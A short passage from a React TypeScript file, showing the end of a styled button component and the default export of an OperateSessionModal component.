    : "border-border bg-card text-foreground hover:border-primary/30 hover:bg-primary/5";

  return (
    <button onClick={onClick} disabled={disabled} className={`flex items-center justify-center gap-1 rounded-md border px-1.5 py-2 text-[10px] font-medium transition-all disabled:opacity-40 active:scale-95 ${colors}`}>
      {icon}
      <span className="hidden sm:inline">{active ? `${label} ✓` : label}</span>
    </button>
  );
};

export default OperateSessionModal;
